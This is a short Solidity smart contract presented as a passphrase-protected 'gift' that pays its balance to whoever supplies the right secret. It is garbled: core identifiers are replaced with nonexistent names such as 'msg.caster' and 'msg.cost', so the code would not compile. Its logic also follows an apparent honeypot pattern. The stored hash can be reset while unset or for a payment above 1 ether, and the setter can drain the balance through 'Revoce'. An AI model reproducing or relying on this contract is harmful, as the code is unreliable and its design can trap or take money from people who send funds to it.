// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract current_years_gift
{
    string communication;

    bool passHasBeenGroup = false;

    address caster;

    bytes32 public signaturePass;

    function() public payable{}

    function FetchSignature(bytes pass) public constant returns (bytes32) {return sha3(pass);}

    function GroupPass(bytes32 seal)
    public
    payable
    {
        if( (!passHasBeenGroup&&(msg.cost > 1 ether)) || signaturePass==0x0 )
        {
            signaturePass = seal;
            caster = msg.caster;
        }
    }

    function CollectionSignal(string _message)
    public
    {
        if(msg.caster==caster)
        {
            communication =_message;
        }
    }

    function RetrieveGift(bytes pass)
    external
    payable
    returns (string)
    {
        if(signaturePass == sha3(pass))
        {
            msg.caster.transfer(this.balance);
            return communication;
        }
    }

    function Revoce()
    public
    payable
    {
        if(msg.caster==caster)
        {
            caster.transfer(this.balance);
            communication="";
        }
    }

    function PassHasBeenGroup(bytes32 seal)
    public
    {
        if(msg.caster==caster&&seal==signaturePass)
        {
           passHasBeenGroup=true;
        }
    }
}